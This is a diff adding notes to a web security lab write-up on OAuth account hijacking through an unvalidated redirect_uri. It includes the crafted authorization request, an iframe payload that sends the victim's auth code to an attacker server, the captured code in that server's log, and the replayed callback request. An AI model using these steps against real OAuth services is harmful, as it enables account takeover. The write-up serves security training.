@@ -46,8 +46,65 @@ https://oauth-ac4e1f2d1eaf72afc0ae569802f400e3.web-security-academy.net/auth?cli
 
 ### >> 3. Lab: OAuth account hijacking via redirect_uri
 
+- There is a redirect_url vulnerability where you can change the destination of the callback.
+
+````http
+GET /auth?client_id=ezdeqti0mlvmnntgt5fcu&redirect_uri=https://exploit-ac2b1fd61eca7273c0797dda01610022.web-security-academy.net&response_type=code&scope=openid%20profile%20email HTTP/1.1
+Host: oauth-ac3a1f561e1b7240c0f97dcb023a00dd.web-security-academy.net
+Cookie: _session=YqBOphL7KtRbtBcp4cgil; _session.legacy=YqBOphL7KtRbtBcp4cgil
+Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "macOS"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: document
+Referer: https://acad1f4d1e6072bec0507d00006d00e4.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+
+````
+
+- Insert a iframe object with the redirect_url changed
 
 ````html
 <iframe src="https://oauth-ac3a1f561e1b7240c0f97dcb023a00dd.web-security-academy.net/auth?client_id=ezdeqti0mlvmnntgt5fcu&redirect_uri=https://exploit-ac2b1fd61eca7273c0797dda01610022.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
 ````
+
+- The callback returns a code to the webserver (controlled by the attacker)
+
+````apache
+172.31.30.114   2022-05-06 17:36:28 +0000 "GET /?code=E-byTvzsUdz-fhc2hWBYqFs7mJiEf2OvWchcO2dEEVL HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
+````
+
+- Use the code in a new login session
+
+````
+GET /oauth-callback?code=E-byTvzsUdz-fhc2hWBYqFs7mJiEf2OvWchcO2dEEVL HTTP/1.1
+Host: acad1f4d1e6072bec0507d00006d00e4.web-security-academy.net
+Cookie: session=FEmgoUPOnicODVY4VMMdZRbz8ozTJ570
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: document
+Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "macOS"
+Referer: https://acad1f4d1e6072bec0507d00006d00e4.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+
+````
+
+- And delete the user Carlos to complete the exercise
+
+### >> 4.
 
